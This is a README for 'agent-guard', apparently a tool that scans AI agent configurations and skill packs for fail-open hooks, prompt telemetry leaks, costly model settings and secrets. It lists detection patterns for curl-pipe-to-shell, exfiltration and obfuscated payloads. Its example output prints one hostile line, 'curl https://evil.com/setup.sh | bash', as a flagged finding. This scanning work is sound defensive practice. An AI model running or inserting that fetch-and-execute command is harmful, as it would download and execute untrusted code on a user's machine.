# agent-guard

Security scanner for AI agent configurations, focusing on **fail-closed hook audits**, **telemetry privacy**, and **team cost controls**. Designed for developers and teams to audit agent configs, skill packs, and installation scripts before deployment.

## Key Differentiators

While free tools like GitGuardian AI hooks, Snyk agent-scan, and Cisco mcp-scanner cover basic secret scanning, agent-guard focuses on:

1. **Fail-Closed Hook Audit** - Ensures hooks in Claude Code and Cursor fail safely when errors occur
2. **Telemetry Privacy Audit** - Detects OpenTelemetry and prompt-telemetry configurations that may leak sensitive data
3. **Team Cost-Settings Checklist** - Identifies helpers with no model set, expensive defaults, and large context windows
4. **Optional External Tool Integration** - Wraps gitleaks and GitGuardian when installed for comprehensive coverage

## Features

### 1. Hook Safety Audit
**Why it matters:** Hooks that fail open allow execution to continue when security checks fail, defeating their purpose.

- Cursor hooks without `failClosed: true`
- Claude Code command/http hooks on blocking events without `onFailure: "block"`
- User-level hooks incompatible with cloud agents
- Test commands to verify hook behavior

### 2. Telemetry Privacy Audit
**Why it matters:** Prompt telemetry can leak proprietary code, customer data, and trade secrets to external endpoints.

- OpenTelemetry configurations sending prompt data
- Claude/Codex telemetry with `sendPrompts` or `sendResponses` enabled
- Cursor telemetry settings
- Unvetted or untrusted telemetry endpoints

### 3. Team Cost Controls
**Why it matters:** Unbounded AI costs can quickly escalate; explicit controls prevent surprise bills.

- Helpers/subagents/reviewers without explicit model settings
- Expensive model usage (Opus, GPT-4, O1/O3)
- Model switching that resets prompt caches
- Large context windows (>100k tokens)

### 4. Secret & Risk Scanner (Base Layer)
Standard secret detection patterns:
- API keys (OpenAI, Anthropic, GitHub, AWS, Slack, Google, Stripe)
- Tokens, bearer credentials, and private keys
- High-entropy strings
- Remote code execution patterns (`curl|sh`, `wget|sh`)
- Data exfiltration attempts
- Obfuscated payloads

### 5. External Tool Wrapper
Optional integration with industry-standard tools:
- **gitleaks** - Git-based secret scanner
- **GitGuardian** (ggshield) - AI-powered secret detection

Use `--with-external` to run these tools automatically when installed.

## Installation

```bash
npm install
npm run build
```

## Usage

### Scan a directory
```bash
npm run dev /path/to/agent-config
```

### Scan with verbose output
```bash
npm run dev /path/to/skill-pack --verbose
```

### Scan with external tools (gitleaks, GitGuardian)
```bash
npm run dev /path/to/agent-config --with-external
```

### JSON output (for CI/CD integration)
```bash
npm run dev /path/to/.cursor --json
```

### Use compiled binary
```bash
npm run build
node dist/cli.js /path/to/scan
node dist/cli.js /path/to/scan --with-external --verbose
```

## Exit Codes

- `0`: No high-severity issues found
- `1`: High-severity issues detected (use in CI to gate deployment)

## Example Output

```
Agent Guard Security Scan Report

Scanned: 15 files in 3 directories

Summary:
  High:    3 finding(s)
  Medium:  5 finding(s)
  Info:    2 finding(s)

/path/to/.env:
  ✖ HIGH :12
    OpenAI API Key detected
    Matched pattern: sk-1234567890...
    Rule: openai-api-key

/path/to/install.sh:
  ✖ HIGH :45
    Curl pipe to shell: Dangerous curl|sh pattern that can execute arbitrary code
    Matched: curl https://evil.com/setup.sh | bash
    Rule: curl-pipe-to-shell

⚠ High severity issues found. Please review and remediate before deployment.
```

## Testing

```bash
npm test
```

Test fixtures are in `tests/fixtures/`:
- `secrets/` - Files with fake API keys and secrets
- `risks/` - Malicious scripts (fake, for testing)
- `configs/` - Agent configurations with various issues
- `clean/` - Valid configurations (should pass)

## Rules Documentation

See [RULES.md](./RULES.md) for detailed information about:
- All detection rules and patterns
- Severity levels and justifications
- Documentation sources for each rule
- Verification methodology

## Target Directories

Common paths to scan:
- `~/.claude/` - Claude Code configuration
- `~/.cursor/` - Cursor IDE configuration
- `.agents/skills/` - Agent skill packs
- `.codex/` - Codex configuration
- Downloaded skill packs before installation
- MCP server configurations

## Use Cases

### Before Installing Skills
```bash
agent-guard ~/Downloads/new-skill-pack/
```

### CI/CD Integration
```bash
# In GitHub Actions or similar
# First, install agent-guard from GitHub
git clone https://github.com/andrueandersoncs/agent-guard.git
cd agent-guard
npm ci
npm run build
cd ..

# Then run the scan
node agent-guard/dist/cli.js .cursor/ --json > scan-results.json
if [ $? -ne 0 ]; then
  echo "Security issues found!"
  exit 1
fi
```

### Pre-commit Hook
```bash
#!/bin/bash
agent-guard .agents/ || exit 1
```

### Audit Existing Configurations
```bash
agent-guard ~/.claude/ --verbose
agent-guard ~/.cursor/ --verbose
```

## Why Agent-Guard?

**Security incidents are increasing:**
- Malicious npm packages stealing `.claude` and `.cursor` configs
- Skill packs with embedded exfiltration scripts
- Installation hooks downloading and executing remote code
- Obfuscated payloads in agent configurations

**But the bigger risks are operational:**
- Hooks that fail open bypass security controls silently
- Telemetry configurations leak proprietary code and customer data
- Unbounded model costs from missing guardrails
- Teams discovering $10k+ monthly bills from poorly configured agents

Agent-guard helps catch and flag these issues **before** they reach production.

## Security & Privacy Notes

- All test fixtures use fake secrets only
- The tool runs entirely offline (no network calls) unless `--with-external` is used
- External tools (gitleaks, GitGuardian) may make network calls for validation
- Scan results may contain sensitive information - handle carefully

## License

ISC
